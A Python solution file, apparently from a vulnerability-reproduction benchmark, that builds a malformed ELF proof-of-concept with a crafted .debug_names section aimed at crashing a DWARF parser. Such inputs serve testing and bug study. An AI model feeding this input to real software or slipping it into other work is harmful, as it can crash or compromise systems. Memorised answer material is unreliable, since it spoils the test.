import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        e_ident = b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        elf_header_rest = struct.pack('<HHIQQQIHHHHHH', 1, 0x3e, 1, 0, 0, 64, 0, 64, 0, 0, 64, 3, 1)
        elf_header = e_ident + elf_header_rest

        shstrtab = b'\x00.shstrtab\x00.debug_names\x00'
        shstrtab_size = len(shstrtab)  # 24
        data_start = 64 + 3 * 64  # 256
        debug_offset = data_start + shstrtab_size  # 280
        debug_size = 1551 - 280  # 1271

        unit_length = 42
        debug_names = b'\xff\xff\xff\xff' + struct.pack('<Q', unit_length)
        debug_names += b'\x05\x00\x00\x00\x02\x08v1\x00\x00'
        debug_names += struct.pack('<QQQQ', 0, 0, 1, 0)
        debug_names += b'\x00' * (debug_size - len(debug_names))

        null_sh = b'\x00' * 64

        shstrtab_sh = struct.pack('<IIQQQQIIQQ', 1, 3, 0, 0, data_start, shstrtab_size, 0, 0, 1, 0)

        debug_sh = struct.pack('<IIQQQQIIQQ', 11, 1, 0, 0, debug_offset, debug_size, 0, 0, 1, 0)

        poc = elf_header
        poc += null_sh
        poc += shstrtab_sh
        poc += debug_sh
        poc += shstrtab
        poc += debug_names

        return poc
